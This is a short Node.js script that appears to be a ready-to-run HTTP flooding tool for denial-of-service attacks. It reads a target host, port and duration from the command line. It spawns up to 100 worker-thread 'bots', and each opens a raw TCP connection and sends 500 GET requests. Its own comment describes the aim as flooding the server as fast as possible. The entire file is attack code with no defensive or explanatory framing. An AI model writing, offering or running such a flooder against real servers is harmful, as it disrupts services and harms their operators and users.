const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const net = require('net');

const serverHost = process.argv[2];
const serverPort = process.argv[3];
const botCount = 100;
const floodDuration = process.argv[4] * 1000;
const botScript = __filename;

function createConnection(index) {
  const client = new net.Socket();

  client.connect(serverPort, serverHost, () => {
    parentPort.postMessage(`Bot${index} connected`);
      for (let h = 0; h < 500; h++) {
    client.write('GET / HTTP/1.1\r\nHost: ' + serverHost + '\r\n\r\n')
      }
  });

  client.on('close', () => {
    parentPort.postMessage(`Bot${index} disconnected`);
  });

  client.on('error', (err) => {
    parentPort.postMessage(`Bot${index} encountered an error: ${err.message}`);
  });
}

function runFlood() {
  const startTime = Date.now();
  let activeConnections = 0;

  // Create workers to flood the server as fast as possible
  while (Date.now() - startTime < floodDuration) {
    if (activeConnections < botCount) {
      const worker = new Worker(botScript, {
        workerData: { index: activeConnections + 1 }
      });

      activeConnections++;

      worker.on('message', (message) => {
        console.log(message);
      });

      worker.on('error', (err) => {
        console.error(`Worker ${activeConnections} encountered an error:`, err);
      });

      worker.on('exit', (code) => {
        if (code !== 0) {
          console.error(`Worker ${activeConnections} stopped with exit code ${code}`);
        }
        activeConnections--;
      });
    }
  }

  console.log('Flooding completed.');
}

// Worker thread script
if (isMainThread) {
  runFlood();
} else {
  createConnection(workerData.index);
}
